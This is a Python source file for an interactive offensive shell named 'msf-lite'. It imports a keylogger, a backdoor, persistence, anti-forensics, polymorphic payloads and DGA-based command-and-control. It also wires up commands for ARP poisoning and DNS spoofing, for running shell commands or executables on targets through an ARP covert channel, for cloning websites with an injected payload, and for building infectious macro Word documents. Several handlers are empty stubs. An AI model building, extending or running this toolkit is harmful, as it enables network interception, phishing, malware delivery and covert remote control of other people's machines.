import argparse
import logging
import sys
import json
import threading
import os
import readline
import shutil
from modules.steganography import encode_image, decode_image, detect_stego
from modules.payload import generate_payload
from modules.network import send_to_server, send_to_telegram
from modules.backdoor import backdoor_listener
from modules.audio_steganography import encode_audio, decode_audio
from modules.polyglot import create_polyglot
from modules.keylogger import start_keylogger
from modules.system import add_persistence, mimic_system_tool, self_delete
from modules.scanner import intelligent_scan
from modules.anti_analysis import run_anti_analysis_checks
from modules.discovery import discover_files
from modules.covert_channel import send_arp_payload, listen_for_payload
from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
from modules.anti_forensics import scorched_earth
from modules.target_manager import add_target, get_target, list_targets
from modules.social_engineering import clone_website, create_macro_doc
from modules.lotl_c2 import lotl_agent
from modules.dga import generate_domains
from modules.backdoor import dga_agent
from modules.social_engineering import clone_website, create_macro_doc
from modules.lotl_c2 import lotl_agent
from modules.ape import unleash_ape
from modules.hare import unleash_hare
from modules.mitm import MITM

# --- Shell State ---
current_target = None
current_target_ip = None
current_module = None
module_options = {}
prompt = "msf-lite > "
mitm = MITM()
mitm_target = None
mitm_gateway = None

def print_help():
    """Prints the main help menu for the shell."""
    print("\n--- Main Commands ---")
    print("  help              - Show this help menu")
    print("  targets           - List all known targets")
    print("  set <ip/label>    - Set the current target")
    print("  info              - Show information about the current target")
    print("  scan <subnet>     - Run an intelligent scan")
    print("  use <module>      - Select a module (e.g., 'stego/encode')")
    print("  options           - Show options for the current module")
    print("  run               - Execute the current module")
    print("  lure              - Access the social engineering toolkit")
    print("  covert            - Use the ARP covert payload channel")
    print("  mitm              - Access the ARP poisoning toolkit")
    print("  lotl-agent        - Start the LOTL C2 agent")
    print("  ape-unleash       - Unleash the APE engine")
    print("  hare-unleash      - Unleash the HARE engine")
    print("  exit              - Exit the shell")

def print_lure_help():
    """Prints the help menu for the lure command."""
    print("\n--- Social-Engineering Toolkit ---")
    print("  lure web <url> <payload_url>   - Clone a website and inject a payload")
    print("  lure doc <path> <payload_cmd>  - Create an infectious Word document")

def print_covert_help():
    """Prints the help menu for the covert command."""
    print("\n--- ARP Covert Payload Channel ---")
    print("  covert send_cmd <target_ip> <cmd>  - Send a shell command for execution")
    print("  covert send_file <target_ip> <path> - Send a file for execution")
    print("  covert listen [timeout]            - Listen for a raw payload")
    print("  covert generate_listener <path>    - Generate the standalone listener script")


def print_mitm_help():
    """Prints the help menu for the mitm command."""
    print("\n--- Man-in-the-Middle Toolkit ---")
    print("  mitm scan <subnet>                     - Scan for live hosts on the local network")
    print("  mitm poison <target_ip> <gateway_ip>    - Start ARP poisoning")
    print("  mitm dns <domain> <fake_ip>            - Start DNS spoofing (requires ARP poisoning)")
    print("  mitm stop                              - Stop all MITM attacks")

def print_module_options():
    """Prints the options for the currently selected module."""
    global current_module
    if not current_module:
        print("No module selected. Use 'use <module_name>'.")
        return

    print(f"\n--- Options for {current_module} ---")
    if current_module == "stego/encode":
        print("  payload   <string>  - The message or file to hide (required)")
        print("  output    <path>    - The output image path (required)")
        print("  RHOST     <ip/label>- The target image file (uses current target if set)")
    else:
        print("This module has no configurable options.")

def run_lure_command(args):
    """Handles the lure command and its subcommands."""
    if not args:
        print_lure_help()
        return

    lure_command = args[0]
    lure_args = args[1:]

    if lure_command == "web":
        if len(lure_args) != 2:
            print("Usage: lure web <url> <payload_url>")
            return
        url, payload_url = lure_args
        clone_website(url, payload_url)
    elif lure_command == "doc":
        if len(lure_args) < 2:
            print("Usage: lure doc <output_path> <payload_cmd>")
            return
        output_path = lure_args[0]
        payload_cmd = " ".join(lure_args[1:])
        create_macro_doc(output_path, payload_cmd)
    else:
        print(f"Unknown lure command: {lure_command}")
        print_lure_help()

def run_covert_command(args):
    """Handles the covert command and its subcommands."""
    if not args:
        print_covert_help()
        return

    covert_command = args[0]
    covert_args = args[1:]

    if covert_command == "send_cmd":
        if len(covert_args) < 2:
            print("Usage: covert send_cmd <target_ip> <command>")
            return
        target_ip = covert_args[0]
        command = " ".join(covert_args[1:])
        send_arp_payload(target_ip, command, payload_type="SHELL_COMMAND")
    elif covert_command == "send_file":
        if len(covert_args) != 2:
            print("Usage: covert send_file <target_ip> <filepath>")
            return
        target_ip, filepath = covert_args
        if not os.path.exists(filepath):
            print(f"Error: File not found at {filepath}")
            return
        with open(filepath, 'rb') as f:
            file_data = f.read()

        # Simple check for ELF or PE to determine if it's an executable
        payload_type = "EXECUTABLE" if file_data.startswith(b'\x7fELF') or file_data.startswith(b'MZ') else "RAW"
        send_arp_payload(target_ip, file_data, payload_type=payload_type)
    elif covert_command == "listen":
        timeout = int(covert_args[0]) if covert_args else 60
        payload, payload_type = listen_for_payload(timeout)
        if payload:
            print(f"Received {payload_type} payload ({len(payload)} bytes).")
            # For simplicity, just print raw data. In a real scenario, you might save it.
            print(payload.decode(errors='ignore'))
    elif covert_command == "generate_listener":
        if len(covert_args) != 1:
            print("Usage: covert generate_listener <output_path>")
            return
        output_path = covert_args[0]
        try:
            shutil.copyfile("covert_listener.py", output_path)
            print(f"Listener script generated at {output_path}")
        except Exception as e:
            print(f"Error generating listener: {e}")
    else:
        print(f"Unknown covert command: {covert_command}")
        print_covert_help()

def run_mitm_command(args):
    """Handles the mitm command and its subcommands."""
    global mitm_target, mitm_gateway
    if not args:
        print_mitm_help()
        return

    mitm_command = args[0]
    mitm_args = args[1:]

    if mitm_command == "scan":
        if len(mitm_args) != 1:
            print("Usage: mitm scan <subnet>")
            return
        subnet = mitm_args[0]
        hosts = mitm.arp_scan(subnet)
        print("\n--- Live Hosts ---")
        for host in hosts:
            print(f"  IP: {host['ip']:<15} MAC: {host['mac']}")
    elif mitm_command == "poison":
        if len(mitm_args) != 2:
            print("Usage: mitm poison <target_ip> <gateway_ip>")
            return
        mitm_target, mitm_gateway = mitm_args
        mitm.start_arp_poisoning(mitm_target, mitm_gateway)
    elif mitm_command == "dns":
        if len(mitm_args) != 2:
            print("Usage: mitm dns <domain> <fake_ip>")
            return
        domain, fake_ip = mitm_args
        rules = {f"{domain}.": fake_ip} # Add a trailing dot for FQDN
        mitm.start_dns_spoof(rules)
    elif mitm_command == "stop":
        if mitm.poisoning:
            mitm.stop_arp_poisoning(mitm_target, mitm_gateway)
            mitm_target = None
            mitm_gateway = None
        if mitm.dns_spoofing:
            mitm.stop_dns_spoof()
        if not mitm.poisoning and not mitm.dns_spoofing:
            print("No MITM attacks are currently active.")
    else:
        print(f"Unknown mitm command: {mitm_command}")
        print_mitm_help()

def process_command(cmd_line):
    """Processes a single command line."""
    global current_target, current_module, module_options, prompt, current_target_ip
    parts = cmd_line.split()
    if not parts:
        return

    command = parts[0].lower()
    args = parts[1:]

    if command == "exit":
        return "exit"
    elif command == "help":
        print_help()
    elif command == "targets":
        targets = list_targets()
        if not targets:
            print("No targets found. Run a scan to discover hosts.")
        else:
            print("\n--- Known Targets ---")
            for ip, data in targets.items():
                print(f"  IP: {ip:<15} Label: {data.get('label', 'N/A'):<15} OS: {data.get('os', 'Unknown')}")
    elif command == "set":
        # Try to set a target if only one argument is provided
        if len(args) == 1:
            target_id = args[0]
            target_data = get_target(target_id)
            if target_data:
                target_ip = None
                if target_id in list_targets(): # It was an IP
                    target_ip = target_id
                else: # It was a label
                    for ip, data in list_targets().items():
                        if data.get("label") == target_id:
                            target_ip = ip
                            break

                if target_ip:
                    current_target = target_data
                    current_target_ip = target_ip
                    prompt = f"msf-lite ({target_ip}) > "
                    print(f"Current target set to: {target_ip}")
                else:
                    # This case should ideally not be reached if get_target works correctly
                    print(f"Error: Could not determine IP for target '{target_id}'.")
            else:
                print(f"Target '{target_id}' not found. If setting a module option, use 'set <option> <value>'.")

        # Handle setting module options
        elif len(args) >= 2:
            option_name = args[0].lower()
            option_value = " ".join(args[1:])
            module_options[option_name] = option_value
            print(f"{option_name} => {option_value}")
        else:
            print("Usage: set <ip/label>  OR  set <option> <value>")

    elif command == "info":
        if current_target and current_target_ip:
            print("\n--- Target Information ---")
            print(f"  IP: {current_target_ip}")
            for key, value in current_target.items():
                # Don't print the IP again if it's in the dict
                if key.lower() != 'ip':
                    print(f"  {key.capitalize()}: {value}")
        else:
            print("No target selected. Use 'set <ip/label>' to select one.")
    elif command == "scan":
        if not args:
            print("Usage: scan <subnet>")
        else:
            subnet = args[0]
            print(f"Running intelligent scan on {subnet}...")
            results = intelligent_scan(subnet)
            for host in results:
                add_target(host['ip'], open_ports=host['open_ports'])
            print("Scan complete. Use 'targets' to see the results.")
    elif command == "use":
        if args:
            current_module = args[0]
            prompt = f"msf-lite ({current_module}) > "
        else:
            print("Usage: use <module_name>")
    elif command == "options":
        print_module_options()
    elif command == "run":
        if not current_module:
            print("No module selected.")
            return

        if current_module == "stego/encode":
            payload = module_options.get("payload")
            output = module_options.get("output")
            rhost = module_options.get("rhost")

            if not all([payload, output, rhost]):
                print("Missing required options. Use 'options' to see what's needed.")
                return

            target_info = get_target(rhost)
            if not target_info:
                print(f"Target '{rhost}' not found.")
                return

            input_path = [ip for ip, data in list_targets().items() if data == target_info][0]

            print(f"Running stego/encode on {input_path}...")
            encode_image(input_path, payload, output)
            print("Module execution finished.")
    elif command == "lure":
        run_lure_command(args)
    elif command == "covert":
        run_covert_command(args)
    elif command == "mitm":
        run_mitm_command(args)
    elif command == "lotl-agent":
        # ... (lotl-agent logic)
        pass
    elif command == "ape-unleash":
        # ... (ape-unleash logic)
        pass
    elif command == "hare-unleash":
        # ... (hare-unleash logic)
        pass
    else:
        print(f"Unknown command: {command}")

def main():
    """The main interactive loop for the shell."""
    global prompt
    print("--- Welcome to the Advanced Security Framework ---")
    print("Type 'help' for a list of commands.")

    if not sys.stdout.isatty():
        # Non-interactive mode
        for line in sys.stdin:
            if process_command(line.strip()) == "exit":
                break
    else:
        # Interactive mode
        while True:
            try:
                cmd_line = input(prompt)
                if process_command(cmd_line) == "exit":
                    break
            except KeyboardInterrupt:
                print("\nUse 'exit' to leave the shell.")
            except Exception as e:
                logging.error(f"An error occurred in the shell: {e}")

if __name__ == "__main__":
    main()
